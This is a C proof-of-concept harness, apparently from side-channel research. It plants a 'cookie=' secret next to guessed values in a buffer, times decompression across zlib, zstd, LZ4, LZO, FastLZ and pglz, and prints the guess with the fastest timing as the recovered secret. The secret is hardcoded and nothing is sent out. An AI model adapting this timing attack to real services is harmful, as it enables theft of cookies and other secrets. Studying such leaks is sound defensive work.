#include <stdio.h>
#include "cacheutils.h"
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sched.h>
#include <assert.h>
#include <signal.h>

#include <time.h>

#undef MIN_MATCH
#define MIN_MATCH 6

#define PAGE_SIZE 4096

#ifdef ZLIB_NG
#include <zlib-ng.h>
#if ZLIB_NG == 1
#define uncompress2 zng_uncompress2
#define uncompress zng_uncompress
#define compress2 zng_compress2
#define compress zng_compress
#endif
#else
#include <zlib.h>
#endif

//#define RAND_SECRET 1

#ifdef RAND_SECRET 
#define SECRET "QKOCJETUBLXTUYUMOJWBBAQXAZVMIAKTTXQPSDZGXLPSHQSNIQBQBWGUPHUVXYOFMNUASOTDREHSBBEGNZLHSRUPRGAGZPOSEUYTOSAHSHIHDLTYMBBSGBDOCLUONGCLUYBIMVDQPSEEWTBOQPBYJPCAPDIZNOBQWVGECCCQUZPKXTRNTUEHLFJHONVKEISESCUNHYHWBMRAWDKEBZAZXXZHIKOGHZEOLSIIOWYCUAYRRUXHVDZFETKLNAYIOFKJLDIASGXPRNUGXRNJBVLLMXQLDDYDRUNVGFOBDHXYHOXJSGRLITYJIBGDJAIDINLQPZZBWEFEWLKJATYGXWABUIITAOSYDZIWIHZPIENDYRWYUEUNLYOOSPIHBAHWRSEYCZOKCCOOWCQFJKOGKVBFOYNSTCUWFGSREUNVJOWMQLLODMIKYCFTKLZEYELHHQFCDWHEDYNOFFFIKWBBJCZQLPEYXHEBELVOHHOOELNAIFMIOIAPJTBPZSIWTPLUUMKLRATHUCPHPXMQSYYVDYSOYLCITOAGQCUHNECTFWTLUJNQLMZOHRBCUPLANDJJBAKLLMVRRBQLETONHQIAXSSHPQVOBZCITDYQMNRDNDVHQKENEXQEDDAPXCBCOBLNHHRYDMBHPNGPTCLNQQNCIDFVLLQUJOEFNVDUMGIHBSELNYVSOGOXQIHJCVMEHFUSOBXVFQSNKZBWAMAWDTCXICHMWKSINTQIQYPEGTUNTGPOEKUNPFBQSOJNKUDVWRAJOVSBDTNIMVYJQIYFMHKYZOYTTGIIOPLKKNBATIKSRBDRXLRZYADWKJUDONBQXGVEBCIUCQKMZZPNEINGLSRWECTZDHHHJKIXVWBACAXYUMLNGBBWAHDJMGNDMQNFPPYLMIWISFGRBWIWMQDXMANTNCZMKOROHUMRQYDNGEZIUEAKCHQJMLPWFYJFGOYRGYGUTPUXLRRABERCSAPJDEPCCSVDYSEHYEMYBMUWVDZSPJVIXDBIYFWRCSWHJGIXZXQYNEJA"
//
#else 
#define SECRET "SECRET"
#endif
#define REPEAT 100
#define PREFIX "cookie="

#define NUMBER_OF_GUESSES 26

//ZLIB Block
#ifdef ZLIB
#include <zlib.h>
#define REPS 10
#endif

#if defined(ZLIB) || defined(ZLIBNG)
#define CHECK_ERR(err, msg)                              \
{                                                    \
    if (err != Z_OK)                                 \
    {                                                \
        fprintf(stderr, "%s error: %d\n", msg, err); \
    }                                                \
}

size_t testZlib(uint8_t *in, long unsigned int comprLen, long unsigned int uncomprLen,int level) 
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;
    compr = (uint8_t*)calloc((uInt)comprLen, 1);
    uncompr = (uint8_t*)calloc((uInt)uncomprLen, 1);
    
    int err;
    uint32_t len = comprLen;
        
    compress_start = rdtsc();
    err = compress2(compr, &comprLen, (const Bytef *)in, len,level);
    compress_end = rdtsc();
    CHECK_ERR(err, "compress");
    sched_yield();
    //printf("Len:%zu\n",comprLen);
    for (int i = 0; i < REPEAT; i++)
    {

        decompress_start = rdtsc();
        err = uncompress(uncompr, &uncomprLen, compr, comprLen);
        decompress_end = rdtsc();

        CHECK_ERR(err, "uncompress");

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    CHECK_ERR(err, "uncompress");
    free(compr);
    free(uncompr);
    return uct_min;
}

#endif

//ZSTD
#ifdef ZSTD
#include <zstd.h>
#define CHECK(cond, ...)                        \
    do {                                        \
        if (!(cond)) {                          \
            fprintf(stderr,                     \
                    "%s:%d CHECK(%s) failed: ", \
                    __FILE__,                   \
                    __LINE__,                   \
                    #cond);                     \
            fprintf(stderr, "" __VA_ARGS__);    \
            fprintf(stderr, "\n");              \
            exit(1);                            \
        }                                       \
    } while (0)

/*! CHECK_ZSTD
 * Check the zstd error code and die if an error occurred after printing a
 * message.
 */

#define CHECK_ZSTD(fn, ...)                                      \
    do {                                                         \
        size_t const err = (fn);                                 \
        CHECK(!ZSTD_isError(err), "%s", ZSTD_getErrorName(err)); \
    } while (0)

size_t testZstd(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;
    
    size_t compr_bound = ZSTD_compressBound(comprLen);
    compr = (uint8_t*)calloc((unsigned int)compr_bound, 1);

    int err;
    long unsigned int len = comprLen;
        
    compress_start = rdtsc();
    //first out params then in
    size_t const cSize = ZSTD_compress(compr,compr_bound,in,(size_t)comprLen,level);
    compress_end = rdtsc();
    CHECK_ZSTD(cSize);

    unsigned long long const rSize = ZSTD_getFrameContentSize(compr,cSize);
    uncompr = (uint8_t*)calloc((unsigned int)uncomprLen, 1);

    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        size_t const dSize = ZSTD_decompress(uncompr,rSize,compr,cSize);
        decompress_end = rdtsc();
        CHECK_ZSTD(dSize);

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(compr);
    free(uncompr);
    return uct_min;
}
#endif


//LZO
#ifdef LZO
#include <lzo/lzo1x.h>

#ifndef IN_LEN
#define IN_LEN 4096 //(128 * 1024L)
#endif
#define OUT_LEN (IN_LEN + IN_LEN / 16 + 64 + 3)

#define CHECK_LZO(err, msg)                              \
{                                                    \
    if (err != LZO_E_OK)                                 \
    {                                                \
        fprintf(stderr, "%s error: %d\n", msg, err); \
    }                                                \
}

size_t testLzo(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    //TODO: there are also other modess
    // LZO1X_999_MEM_COMPRESS,LZO1X_1_15_MEM_COMPRESS,LZO1X_1_12_MEM_COMPRESS,LZO1X_1_11_MEM_COMPRESS
    void* wrkmem = (void*)malloc(LZO1X_1_12_MEM_COMPRESS);
    
    compr = (uint8_t*)calloc(comprLen, 1);

    int err;
    
    
    compress_start = rdtsc();
    //first out params then in
    err = lzo1x_1_compress(in,comprLen,compr, &uncomprLen, wrkmem);
    compress_end = rdtsc();
    CHECK_LZO(err,"compress");

    size_t out_len = comprLen + comprLen / 16 + 64 + 3;
    printf("%zu\n",out_len);
    uncompr = (uint8_t*)calloc(out_len, 1);

    long unsigned int new_len = comprLen;
    sched_yield();
    
    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        err = lzo1x_decompress(compr,uncomprLen,uncompr,&new_len,NULL);
        decompress_end = rdtsc();
        CHECK_LZO(err,"decmopress");

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }
    free(wrkmem);
    free(compr);
    free(uncompr);
    return uct_min;
}
#endif

#ifdef FASTLZ
#include "../libraries/FastLZ/fastlz.h"

size_t testFastlz(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    int compress_level = 2;

    compr = (uint8_t*)calloc(comprLen, 1);
    uncompr = (uint8_t*)calloc(comprLen * 10, 1);
    int err;

 
    compress_start = rdtsc();
    size_t chunk_size = fastlz_compress_level(compress_level,in,comprLen,compr);
    compress_end = rdtsc();



    unsigned int new_len = comprLen;
    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        size_t size_decompressed = fastlz_decompress(compr,chunk_size,uncompr,comprLen*2);
        decompress_end = rdtsc();

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    //free(compr);
    //free(uncompr);
    return uct_min;
}

#endif

#ifdef LZ4
#include <lz4.h>

size_t testLZ4(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    const int max_dst_size = LZ4_compressBound(comprLen);

    compr = (uint8_t*)calloc(max_dst_size, 1);
    uncompr = (uint8_t*)calloc(comprLen * 10, 1);
    int err;

 
    compress_start = rdtsc();
    const int compressed_data_size = LZ4_compress_default(in,compr,comprLen, max_dst_size);
    compress_end = rdtsc();

    unsigned int new_len = comprLen;
    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        const int decompressed_size = LZ4_decompress_safe(compr,uncompr,compressed_data_size,comprLen);
        decompress_end = rdtsc();

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(compr);
    free(uncompr);
    return uct_min;
}

#endif

#ifdef PGLZ
#include "pg_lzcompress.h"
#define REPS 1
size_t testPGLZ(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level) {
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    /*
     * Figure out the maximum possible size of the pglz output, add the bytes
     * that will be needed for varlena overhead, and allocate that amount.
     */
    char *tmp = (char *) calloc(PGLZ_MAX_OUTPUT(uncomprLen), 1);
    /* allocate memory for the uncompressed data */
    char *result = (char *) calloc(uncomprLen, 1);

    compress_start = rdtsc();
    int32 _comprLen = pglz_compress(in,
                        uncomprLen,
                        tmp,
                        PGLZ_strategy_default);
    compress_end = rdtsc();
    // compression succeeds only with at least a byte saved
    if(_comprLen < 0)
        return -1;
    comprLen = (unsigned long)_comprLen;

    sched_yield();
    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        int32 rawsize = pglz_decompress(tmp,
                                comprLen,
                                result,
                                uncomprLen, true);
        decompress_end = rdtsc();
        assert(rawsize == uncomprLen);

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(tmp);
    free(result);
    return uct_min;
}
#endif


#define CHECK_ERR(err, msg)                              \
    {                                                    \
        if (err != Z_OK)                                 \
        {                                                \
            fprintf(stderr, "%s error: %d\n", msg, err); \
        }                                                \
    }

/* ===========================================================================
 * Usage:  example [output.gz  [input.gz]]
 */

/*const char *dict[] = {
    "SECRA",
    "SECRB",
    "SECRC",
    "SECRD",
    "SECRE",
    "SECRF",
    "SECRG",
    "SECRH",
    "SECRI",
    "SECRJ",
    "SECRK"
};*/
  
char** create_dict(size_t guess_len,size_t num_of_guesses)
{
  // not sure if this influences our generation of the initial page with the 
  // rand modulus
  //srand(time(NULL));
  char** dict = (char**) calloc(sizeof(char*) * num_of_guesses,1);

  int rand_idx = rand() % num_of_guesses;

  for(int i = 0; i < num_of_guesses; i++)
  {
    dict[i] = calloc(sizeof(char) * guess_len  + 1,1);
    strcpy(dict[i],SECRET);

    if(i == rand_idx)
    {
      //SECRET
      dict[i][guess_len - 1] = SECRET[guess_len - 1];
    }
    else
    {
      //RANDOM GUESS
      dict[i][guess_len - 1] = SECRET[guess_len - 1] + i + 1;
    }
    // add 0-byte
    dict[i][guess_len] = '\0';
    //printf("%s\n",dict[i]);
  }
  return dict;
}

void free_dict(char** dict,size_t guess_len,size_t num_of_guesses)
{
  // not sure if this influences our generation of the initial page with the 
  // rand modulus
  for(int i = 0; i < num_of_guesses; i++)
  {
    free(dict[i]);
  }
  free(dict);
}


static const char* const SCHEDULE[] = {
	/* Batch */
	"uops_issued.any",
	"dTLB-load-misses",
	"dTLB-store-misses",
	"branch-misses"
};
static const int NUMCOUNTS = sizeof(SCHEDULE)/sizeof(*SCHEDULE);

int main(int argc, char *argv[])
{
    uLong comprLen = 0, uncomprLen = 0, filesize = 0; // * sizeof(int); /* don't overflow on MSDOS */
    struct stat st;
    int fd = -1;
    int rc = 0;
    size_t size = 0;
    
    if (argc < 5 || argc > 9)
    {
        printf("Usage: %s [random_memory] [offset_secret] [offset_guess] [guess_length] [compression_level] [number_of_secrets] [Initial Page Guess Modulues] [Fill pages]\n", argv[0]);
        return 1;
    }   
        
    // set compression level
    int level = 6; // 6 is default compression level
    if (argc >= 6)
    {
        level = atoi(argv[5]);
        if (level < 1 || level > 9)
        {
            printf("ERR: compression level must be 1...9\n");
            return 1;
        }
    }
    
    // set number of times secret is placed
    int numberSecret = 1; // default
    int rand_modulus = 50; // default
    size_t nr_fill_pages = 0;
    if(argc >= 7)
      numberSecret = atoi(argv[6]);
    if (argc >= 8)
    {
      rand_modulus = atoi(argv[7]);
    }

    if(argc >= 9)
    {
      nr_fill_pages = (size_t)atoi(argv[8]);
    }

    int spaceBetweenGuesses = 1; // default
    // TODO: read from args?

    // if (ptedit_init())
    // {
    //     printf(TAG_FAIL "Error: Could not initalize PTEditor, did you load the kernel module?\n");
    //     return 1;
    // }

    int offsetSecret = atoi(argv[2]);
    int offsetGuess = atoi(argv[3]);
    int lengthGuess = atoi(argv[4]);


    //generate a dictionary for the number of guesses
    char** dict = create_dict(lengthGuess,NUMBER_OF_GUESSES);

    if (lengthGuess <= 0 || lengthGuess > strlen(dict[0])) // this assumes all entries in dict are same length
    {
        printf("Invalid guess length\n");
        return -1;
    }

    fd = open(argv[1], O_RDWR);

    if (fd == -1)
    {
        puts("Error opening file");
        return -1;
    }

    rc = fstat(fd, &st);
    size = st.st_size;
    // fprintf(stderr, "stat() = %d\n", rc);
    // fprintf(stderr, "size=%zu\n", size);

    unsigned char* input_file = mmap(0,size,PROT_READ | PROT_WRITE, MAP_PRIVATE, fd,0);
    if (input_file == MAP_FAILED)
    {
        close(fd);
        perror("Error mmapping the file");
        exit(EXIT_FAILURE);
    }

    unsigned char* mem = mmap(0,nr_fill_pages*PAGE_SIZE + size,PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE,0,0);
    
    if (mem == MAP_FAILED)
    {
        perror("Error mmapping mem");
        exit(EXIT_FAILURE);
    }

    //move back original file to offset
    memcpy(mem+nr_fill_pages*PAGE_SIZE,input_file,size);

    // TODO: leave this here?
    //memset(mem, 0x42, 4096);
    //srand(time(NULL));
    //seed back to default
    srand(1);
    for (int i = 0; i < PAGE_SIZE; i++)
    {
#ifdef PGLZ
    #define RANDOM_BASE (' ')
#else
    #define RANDOM_BASE (0)
#endif
        mem[i] = (unsigned char)((rand() % rand_modulus) + RANDOM_BASE);
    }

    //take same page additionally n times
    for(int i = 1; i <= nr_fill_pages; i++)
    {
        memcpy(mem+i*4096,mem,PAGE_SIZE);
    }

    comprLen = size + (size_t)nr_fill_pages*4096;
    uncomprLen = comprLen;

    //increase start of mem ptr such that it moves to the first page
    //because fuzzer generates data between file size i.e 0-32kB
    char* mem_offset = mem + nr_fill_pages*PAGE_SIZE;
    #ifdef PGLZ
    memcpy(mem_offset + offsetSecret, PREFIX SECRET, strlen(PREFIX SECRET));
    #else
    memcpy(mem + offsetSecret, PREFIX SECRET, strlen(PREFIX SECRET));
    #endif
    

    size_t (*compression_lib)(uint8_t*,long unsigned int,long unsigned int,int level) = NULL;

    //printf("[ all random ]\n");
    
    #ifdef ZLIB
    compression_lib = &testZlib;
    #elif ZLIBNG
    compression_lib = &testZlib;
    #elif ZSTD
    compression_lib = &testZstd;
    #elif LZO
    compression_lib = &testLzo;
    #elif FASTLZ
    compression_lib = &testFastlz;
    #elif LZ4
    compression_lib = &testLZ4;
    #elif PGLZ
    compression_lib = &testPGLZ;
    #else
    printf("library not found"); \
    return -1;
    #endif

    int index = 0;
#ifndef REPS
    #define REPS 1
#endif
    
    for (int k = 0; k < REPS; k++)
    {
      size_t fastest = -1;
      size_t second_fastest = -1;
      for (int i = 0; i < NUMBER_OF_GUESSES; i++)
      {
        void* posFirstGuess = mem_offset + offsetGuess;
        for (int tmp = 0; tmp < numberSecret; tmp++)
        {
            int posGuess = (tmp * (strlen(PREFIX) + strlen(dict[i]) + spaceBetweenGuesses)); // TODO: one char between multiple guesses
            strcpy(posFirstGuess + posGuess, PREFIX);
            memcpy(posFirstGuess + strlen(PREFIX) + posGuess, dict[i], lengthGuess);
        }

        // char filename[40] = "output/"; 
        // strcpy(filename+7,dict[i]);
        // FILE* f2 = fopen(filename,"wb");
        // if(f2)
        // {
        //     //printf("Writing %zu\n",size+(size_t)nr_fill_pages*4096);
        //     fwrite(mem,size+(size_t)nr_fill_pages*4096,1,f2);
        //     sync();
        //     fclose(f2);
        // }

        size_t uncompress_time = compression_lib(mem, comprLen, uncomprLen, level);

        printf("%s;%zd\n", dict[i], uncompress_time);
        if (uncompress_time < fastest)
        {
            //set second fastest
            if (fastest != -1)
            {
                second_fastest = fastest;
            }
            fastest = uncompress_time;
            index = i;
        }
        else if (uncompress_time < second_fastest)
        {
            second_fastest = uncompress_time;
        }
      }
      
      printf("Recovered secret:%s\n", dict[index]);
      printf("Fastest:%zu\nSecond fastest:%zu\n", fastest, second_fastest);
#ifdef PGLZ
      // pglz corner case: if we hit it, we are actually interested on the decompress vs no-decompress diff
      if (fastest != 0xffffffffffffffffuL && second_fastest == 0xffffffffffffffffuL)
        printf("diff fastest to second fastest:%zu\n", fastest);
      else 
#endif
        printf("diff fastest to second fastest:%zu\n", second_fastest - fastest);
      //second_fastest - fastest;

      if(strncmp(dict[index],SECRET,lengthGuess) != 0)                         
      {                                                                        
        goto end;                                                              
      }

    }

    end:

    free_dict(dict,lengthGuess,NUMBER_OF_GUESSES);
    close(fd);

    return 0;
}
